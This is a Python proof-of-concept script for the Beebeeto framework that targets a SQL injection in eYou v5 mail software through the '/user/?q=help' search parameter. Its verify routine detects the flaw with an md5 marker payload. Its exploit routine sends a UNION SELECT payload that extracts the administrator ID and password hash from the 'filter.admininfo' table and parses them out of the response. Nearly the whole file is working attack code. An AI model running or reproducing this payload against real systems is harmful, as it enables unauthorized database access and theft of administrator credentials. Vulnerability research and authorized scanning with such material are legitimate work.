#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import math
import time
import urllib2
import urllib
import hashlib, base64

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0021',# 由Beebeeto官方编辑
            'name': 'eYou v5 /em/controller/action/help.class.php SQL Injection POC',  # 名称
            'author': 'root',  # 作者
            'create_date': '2014-09-23',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'eYou',  # 漏洞所涉及的应用名称
            'vul_version': ['v5'],  # 受漏洞影响的应用版本
            'type': 'SQL injection',  # 漏洞类型
            'tag': ['eYou!', 'sql injection'],  # 漏洞相关tag
            'desc': 'eYou v5 has sql injection in /.',  # 漏洞描述
            'references': ['http://wooyun.org/bugs/wooyun-2014-058014',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload_v = '") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,md5(360213360213),NULL#'
        attack_url = args['options']['target'] + '/user/?q=help&type=search&page=1&kw='
        if args['options']['verbose']:
            print '[*] Request URL: ' + attack_url + payload_v
        request = urllib2.Request(attack_url, payload_v)
        response = urllib2.urlopen(request)
        content = response.read()
        res= '5d975967029ada386ba2980a04b7720e'
        if res in content:
            args['success'] = True
            args['poc_ret']['key'] = res
            return args
        else:
            args['success'] = False
            return args

    @classmethod
    def exploit(cls, args):
        payload = '") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(SELECT CONCAT(0x2d2d2d,IFNULL' \
           '(CAST(admin_id AS CHAR),0x20),0x2d2d2d,IFNULL(CAST(admin_pass AS CHAR),0x20' \
           '),0x2d2d2d) FROM filter.admininfo LIMIT 0,1),NULL#'
        match_data = re.compile('did=---(.*)---([\w\d]{32,32})---')
        attack_url = args['options']['target'] + '/user/?q=help&type=search&page=1&kw='
        if args['options']['verbose']:
            print '[*] Request URL: ' + attack_url+ payload
        request = urllib2.Request(attack_url, payload)
        response = urllib2.urlopen(request).read()
        data = match_data.findall(response)
        if data:
            args['success'] = True
            args['poc_ret']['username'] = data[0][0]
            args['poc_ret']['password'] = data[0][1]
            return args
        else:
            args['success'] = False
            return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
